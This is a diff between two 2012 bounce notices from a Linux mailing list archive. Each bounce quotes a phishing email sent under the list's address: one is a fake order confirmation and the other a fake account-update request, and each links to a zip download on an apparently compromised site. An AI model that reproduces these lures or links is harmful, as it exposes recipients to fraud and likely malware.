@@ -1,10 +1,13 @@
-From: MAILER-DAEMON-gJ2FJtoPpys1UOBuHFfzQt10k2aWwXN4@public.gmane.org (Mail Delivery System)
-Subject: Undelivered Mail Returned to Sender
-Date: Wed, 29 Aug 2012 14:26:07 +0200 (CEST)
-Message-ID: <20120829122607.83A1D44218B3@ma21543.plusserver.de>
+From: <postmaster-IVhwfJzpCFH10XsdtD+oqA@public.gmane.org>
+Subject: Undeliverable: Re: Order 150811-733503387577882.
+Date: Wed, 29 Aug 2012 19:21:45 +0100
+Message-ID: <38638b6b-8590-4494-9a55-ff55e0e79461@axess.co.uk>
+References: <7088318021.60661840606671@ns213760.ovh.net>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============2908830995634149018=="
+Content-Type: multipart/mixed; boundary="===============3260534489369758556=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Content-Language: en-US
+In-Reply-To: <7088318021.60661840606671-e0r/WXrHWLdnXn40ka+A6Q@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -17,176 +20,119 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-encapsulated message.
-
---===============2908830995634149018==
+--===============3260534489369758556==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="157DC44218B2.1346243167/ma21543.plusserver.de"
-Content-Transfer-Encoding: 7bit
+	boundary="c132b81a-05fc-4212-b31a-08d18658b8b4"
+Content-Language: en-US
 
-This is a MIME-encapsulated message.
+--c132b81a-05fc-4212-b31a-08d18658b8b4
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
 
---157DC44218B2.1346243167/ma21543.plusserver.de
-Content-Description: Notification
-Content-Type: text/plain; charset=us-ascii
+Delivery has failed to these recipients or groups:
 
-This is the mail system at host ma21543.plusserver.de.
+doyleuale-IVhwfJzpCFH10XsdtD+oqA@public.gmane.org<mailto:doyleuale-IVhwfJzpCFH10XsdtD+oqA@public.gmane.org>
+The e-mail address you entered couldn't be found. Please check the recipien=
+t's e-mail address and try to resend the message. If the problem continues,=
+ please contact your helpdesk.
 
-I'm sorry to have to inform you that your message could not
-be delivered to one or more recipients. It's attached below.
 
-For further assistance, please send mail to postmaster.
 
-If you do so, please include this problem report. You can
-delete your own text from the attached returned message.
 
-                   The mail system
 
-<gilles.antonettid-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: host
-    svrmail01.adeptscience.co.uk[193.82.202.10] said: 550 5.1.1
-    <gilles.antonettid-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: Recipient address rejected:
-    undeliverable address: host 193.119.170.105[193.119.170.105] said: 550
-    gilles.antonettid-TxSU/Q4FxUPlTrB6C0XxLeQXgrv7xAl4@public.gmane.org No such user (in reply to RCPT TO
-    command) (in reply to RCPT TO command)
 
-<gilles.antonettidd-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: host
-    svrmail01.adeptscience.co.uk[193.82.202.10] said: 550 5.1.1
-    <gilles.antonettidd-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: Recipient address rejected:
-    undeliverable address: host 193.119.170.105[193.119.170.105] said: 550
-    gilles.antonettidd-TxSU/Q4FxUPlTrB6C0XxLeQXgrv7xAl4@public.gmane.org No such user (in reply to RCPT TO
-    command) (in reply to RCPT TO command)
 
-<giustina-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: host svrmail01.adeptscience.co.uk[193.82.202.10]
-    said: 550 5.1.1 <giustina-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: Recipient address rejected:
-    undeliverable address: host 193.119.170.105[193.119.170.105] said: 550
-    giustina-TxSU/Q4FxUPlTrB6C0XxLeQXgrv7xAl4@public.gmane.org No such user (in reply to RCPT TO command)
-    (in reply to RCPT TO command)
+Diagnostic information for administrators:
 
-<giustinan-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: host
-    svrmail01.adeptscience.co.uk[193.82.202.10] said: 550 5.1.1
-    <giustinan-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: Recipient address rejected: undeliverable
-    address: host 193.119.170.105[193.119.170.105] said: 550
-    giustinan-TxSU/Q4FxUPlTrB6C0XxLeQXgrv7xAl4@public.gmane.org No such user (in reply to RCPT TO command)
-    (in reply to RCPT TO command)
+Generating server: axess.co.uk
 
-<giustinann-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: host
-    svrmail01.adeptscience.co.uk[193.82.202.10] said: 550 5.1.1
-    <giustinann-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: Recipient address rejected: undeliverable
-    address: host 193.119.170.105[193.119.170.105] said: 550
-    giustinann-TxSU/Q4FxUPlTrB6C0XxLeQXgrv7xAl4@public.gmane.org No such user (in reply to RCPT TO command)
-    (in reply to RCPT TO command)
+doyleuale-IVhwfJzpCFH10XsdtD+oqA@public.gmane.org
+#550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ##
 
---157DC44218B2.1346243167/ma21543.plusserver.de
-Content-Description: Delivery report
+Original message headers:
+
+Received: from was1-mh235.smtproutes.com (192.1.1.7) by AXESRV001.axess.loc=
+al
+ (192.1.1.15) with Microsoft SMTP Server id 14.1.218.12; Wed, 29 Aug 2012
+ 19:21:44 +0100
+X-Katharion-ID: 1346264279.70358.was1-mh235 (unfiltered-unk)
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from ns213760.ovh.net ([188.165.230.187]) by
+   was1-mh235.smtproutes.com [(10.20.102.66)] with ESMTP via TCP; 29 Aug
+   2012 13:17:59 -0500
+Received: from [188.165.230.187] by ns213760.ovh.net id uA09BospXZxg with
+ SMTP; Wed, 29 Aug 2012 20:18:09 +0200
+Date: Wed, 29 Aug 2012 20:18:09 +0200
+From: OrderCo <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v3.6.48.5) Home
+X-Priority: 3 (Normal)
+Message-ID: <7088318021.60661840606671-e0r/WXrHWLdnXn40ka+A6Q@public.gmane.org>
+To: <doyleuale-IVhwfJzpCFH10XsdtD+oqA@public.gmane.org>
+Subject: Re: Order 150811-733503387577882.
+MIME-Version: 1.0
+Content-Type: text/plain; charset=3D"windows-1252"
+Content-Transfer-Encoding: 8bit
+
+
+--c132b81a-05fc-4212-b31a-08d18658b8b4
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns; ma21543.plusserver.de
-X-Postfix-Queue-ID: 157DC44218B2
-X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Arrival-Date: Wed, 29 Aug 2012 14:25:36 +0200 (CEST)
+Reporting-MTA: dns;axess.co.uk
+Received-From-MTA: dns;was1-mh235.smtproutes.com
+Arrival-Date: Wed, 29 Aug 2012 18:21:44 +0000
 
-Final-Recipient: rfc822; gilles.antonettid-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org
-Original-Recipient: rfc822;gilles.antonettid-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org
+Final-Recipient: rfc822;doyleuale-IVhwfJzpCFH10XsdtD+oqA@public.gmane.org
 Action: failed
 Status: 5.1.1
-Remote-MTA: dns; svrmail01.adeptscience.co.uk
-Diagnostic-Code: smtp; 550 5.1.1 <gilles.antonettid-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>:
-    Recipient address rejected: undeliverable address: host
-    193.119.170.105[193.119.170.105] said: 550
-    gilles.antonettid-TxSU/Q4FxUPlTrB6C0XxLeQXgrv7xAl4@public.gmane.org No such user (in reply to RCPT TO
-    command)
+Diagnostic-Code: smtp;550 5.1.1 RESOLVER.ADR.RecipNotFound; not found
 
-Final-Recipient: rfc822; gilles.antonettidd-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org
-Original-Recipient: rfc822;gilles.antonettidd-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: dns; svrmail01.adeptscience.co.uk
-Diagnostic-Code: smtp; 550 5.1.1 <gilles.antonettidd-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>:
-    Recipient address rejected: undeliverable address: host
-    193.119.170.105[193.119.170.105] said: 550
-    gilles.antonettidd-TxSU/Q4FxUPlTrB6C0XxLeQXgrv7xAl4@public.gmane.org No such user (in reply to RCPT TO
-    command)
 
-Final-Recipient: rfc822; giustina-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org
-Original-Recipient: rfc822;giustina-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: dns; svrmail01.adeptscience.co.uk
-Diagnostic-Code: smtp; 550 5.1.1 <giustina-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: Recipient
-    address rejected: undeliverable address: host
-    193.119.170.105[193.119.170.105] said: 550 giustina-TxSU/Q4FxUPlTrB6C0XxLeQXgrv7xAl4@public.gmane.org
-    No such user (in reply to RCPT TO command)
-
-Final-Recipient: rfc822; giustinan-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org
-Original-Recipient: rfc822;giustinan-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: dns; svrmail01.adeptscience.co.uk
-Diagnostic-Code: smtp; 550 5.1.1 <giustinan-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: Recipient
-    address rejected: undeliverable address: host
-    193.119.170.105[193.119.170.105] said: 550 giustinan-TxSU/Q4FxUPlTrB6C0XxLeQXgrv7xAl4@public.gmane.org
-    No such user (in reply to RCPT TO command)
-
-Final-Recipient: rfc822; giustinann-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org
-Original-Recipient: rfc822;giustinann-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: dns; svrmail01.adeptscience.co.uk
-Diagnostic-Code: smtp; 550 5.1.1 <giustinann-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>: Recipient
-    address rejected: undeliverable address: host
-    193.119.170.105[193.119.170.105] said: 550 giustinann-TxSU/Q4FxUPlTrB6C0XxLeQXgrv7xAl4@public.gmane.org
-    No such user (in reply to RCPT TO command)
-
---157DC44218B2.1346243167/ma21543.plusserver.de
-Content-Description: Undelivered Message
+--c132b81a-05fc-4212-b31a-08d18658b8b4
 Content-Type: message/rfc822
-Content-Transfer-Encoding: 7bit
 
+Received: from was1-mh235.smtproutes.com (192.1.1.7) by AXESRV001.axess.local
+ (192.1.1.15) with Microsoft SMTP Server id 14.1.218.12; Wed, 29 Aug 2012
+ 19:21:44 +0100
+X-Katharion-ID: 1346264279.70358.was1-mh235 (unfiltered-unk)
 Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-No-Relay: not in my network
-X-No-Relay: not in my network
-X-No-Relay: not in my network
-X-No-Relay: not in my network
-X-No-Relay: not in my network
-Received: from 96.43.135.138 (unknown [96.43.135.138])
-	by ma21543.plusserver.de (Postfix) with ESMTPA id 157DC44218B2;
-	Wed, 29 Aug 2012 14:25:36 +0200 (CEST)
-Received: from [96.43.135.138] by 96.43.135.138 id lBE4KpW3Zsex with SMTP; Wed, 29 Aug 2012 07:52:05 -0500
-Date: Wed, 29 Aug 2012 07:52:05 -0500
-From: "Supportpay" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v4.5.58.9) Business
+Received: from ns213760.ovh.net ([188.165.230.187]) by
+   was1-mh235.smtproutes.com [(10.20.102.66)] with ESMTP via TCP; 29 Aug
+   2012 13:17:59 -0500
+Received: from [188.165.230.187] by ns213760.ovh.net id uA09BospXZxg with
+ SMTP; Wed, 29 Aug 2012 20:18:09 +0200
+Date: Wed, 29 Aug 2012 20:18:09 +0200
+From: OrderCo <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v3.6.48.5) Home
 X-Priority: 3 (Normal)
-Message-ID: <03268422.37419723573160-DlPhvCh5gilc0KMCXLrx4Q@public.gmane.org>
-To: <gilles.antonettid-TxSU/Q4FxUPlTrB6C0XxLbVCufUGDwFn@public.gmane.org>
-Subject: Order n2698509
+Message-ID: <7088318021.60661840606671-e0r/WXrHWLdnXn40ka+A6Q@public.gmane.org>
+To: <doyleuale-IVhwfJzpCFH10XsdtD+oqA@public.gmane.org>
+Subject: Re: Order 150811-733503387577882.
 MIME-Version: 1.0
-Content-Type: text/plain;
-	charset="windows-1252"
+Content-Type: text/plain; charset="windows-1252"
 Content-Transfer-Encoding: quoted-printable
 
 
-         =20
-Thank you for the order,   =20
-      =20
-This message is to inform you that your order has been received and is cu=
-rrently being processed.
 
-Your order reference is 780018538.
 
-Your credit card will be charged for 408 dollars.
+Dear client, {#FIRST_DESCR}.
 
-Information about the order and delivery located at:
-http://siranmuftulugu.gov.tr/Order/Order.zip?ReplyID.pGTwrU1FifAX
+Sorry for the delay.
 
-   =20
+Update your account information.
+
+http://plandeapoyofamiliar.com/Information/Response.zip
+
+
 =3D=3D
-Best regards, ticket service.  =20
+Best regards,
+Tel./Fax.: (076) 366 37 151
 
 
 
---157DC44218B2.1346243167/ma21543.plusserver.de--
 
---===============2908830995634149018==
+--c132b81a-05fc-4212-b31a-08d18658b8b4--
+
+--===============3260534489369758556==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -196,4 +142,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============2908830995634149018==--
+--===============3260534489369758556==--
